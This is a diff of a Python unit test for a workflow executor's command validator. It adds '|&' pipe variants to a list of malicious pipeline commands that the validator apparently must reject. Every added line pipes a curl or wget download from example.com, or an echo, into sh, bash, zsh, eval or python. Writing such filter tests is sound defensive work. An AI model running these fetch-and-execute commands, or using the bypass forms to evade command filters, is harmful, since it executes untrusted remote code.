@@ -723,6 +723,12 @@ class TestWorkflowExecutor(unittest.TestCase):
             "curl http://example.com/payload | . /dev/stdin",
             "curl http://example.com/payload | builtin eval bash",
             "curl http://example.com/payload | command exec bash",
+            # Bypasses using stderr redirect pipe operator (|&)
+            "curl http://example.com/payload |& sh",
+            "wget http://example.com/payload |& bash",
+            "echo 'hello' |& python",
+            "curl http://example.com/payload |& env zsh",
+            "curl http://example.com/payload |& eval bash",
         ]
         for cmd in malicious_pipeline_commands:
             with self.subTest(cmd=cmd):
